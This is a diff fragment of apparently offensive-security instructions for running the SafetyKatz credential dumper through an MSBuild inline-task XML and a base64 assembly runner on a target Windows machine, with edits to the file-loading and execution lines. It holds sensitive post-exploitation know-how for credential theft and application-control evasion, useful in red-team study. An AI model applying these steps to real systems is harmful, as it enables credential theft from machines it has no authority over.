@@ -18,9 +18,14 @@ Host safetykatz.b64 on a webserver like Apache or Python Simple HTTP Server etc.
 Transfer MsbuildInline.xml and assemblyrunner.b64 to target machine
 Windows:
 Alter the MsbuildInline.xml to look like the following:
+Change filename to:
+			 string s = System.IO.File.ReadAllText(@"assemblyrunner.b64");			 
+			 
+Change Execution to:			 
+			 
 			 //Below Two lines get commented if args needed
 			 //object o = a.CreateInstance(method.Name);
-       //method.Invoke(o, null);
+            		 //method.Invoke(o, null);
 			 
 			 //If Args are required uncomment below two lines and comment above line
 			 string args1 = "-net";
